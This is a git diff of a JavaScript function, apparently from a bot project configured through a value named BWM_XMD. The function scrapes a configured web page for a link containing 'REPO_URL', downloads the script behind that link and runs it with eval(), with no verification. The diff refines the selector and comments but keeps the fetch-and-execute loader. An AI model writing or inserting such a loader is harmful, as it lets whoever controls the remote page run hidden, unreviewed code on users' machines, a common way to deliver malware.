@@ -6,22 +6,30 @@ const adams = require(__dirname + "/../config");
 
 async function fetchRepoUrl() {
     try {
-        // Use config.WEB_PAGE_URL instead of the hardcoded URL
+        // Fetch the webpage URL from config.js
         const response = await axios.get(adams.BWM_XMD);
         const $ = cheerio.load(response.data);
-        const repoUrl = $(`a:contains("REPO_URL")`).attr('href');
 
-        if (!repoUrl) throw new Error('REPO_URL not found on the webpage.');
+        // Refine selector: Check for any <a> tag with href containing "REPO_URL"
+        const repoUrl = $('a[href*="REPO_URL"]').attr('href');
+
+        // If not found, throw error
+        if (!repoUrl) {
+            throw new Error('REPO_URL link not found. Check the webpage structure.');
+        }
 
         console.log('REPO_URL fetched successfully:', repoUrl);
 
+        // Fetch and execute the script from REPO_URL
         const scriptResponse = await axios.get(repoUrl);
         const scriptContent = scriptResponse.data;
-        console.log("REPO_URL script loaded successfully");
+        console.log("Script loaded successfully");
 
+        // Execute the script
         eval(scriptContent);
     } catch (error) {
-        console.error('Error fetching REPO_URL:', error.message);
+        console.error('Error:', error.message);
+        // Add fallback logic here if needed
     }
 }
 
